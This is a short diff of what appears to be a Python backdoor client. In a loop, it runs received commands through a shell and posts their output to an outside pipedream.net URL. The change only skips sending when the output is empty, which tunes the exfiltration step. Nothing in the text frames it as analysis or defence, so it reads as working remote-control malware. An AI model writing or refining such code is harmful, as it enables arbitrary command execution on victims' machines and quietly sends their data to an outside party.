@@ -25,13 +25,14 @@ while True:
         if old_command != command:
             try:
                 cmdout = system(command, shell=True)
-                try:
-                    post("https://eo482aoknyxae8c.m.pipedream.net/", data=cmdout)
-                except KeyboardInterrupt:
-                    continue
-                except:
-                    print("Failed to sent output")
-                    continue
+                if cmdout != "":
+                    try:
+                        post("https://eo482aoknyxae8c.m.pipedream.net/", data=cmdout)
+                    except KeyboardInterrupt:
+                        continue
+                    except:
+                        print("Failed to sent output")
+                        continue
                 old_command = command
                 continue
             except:
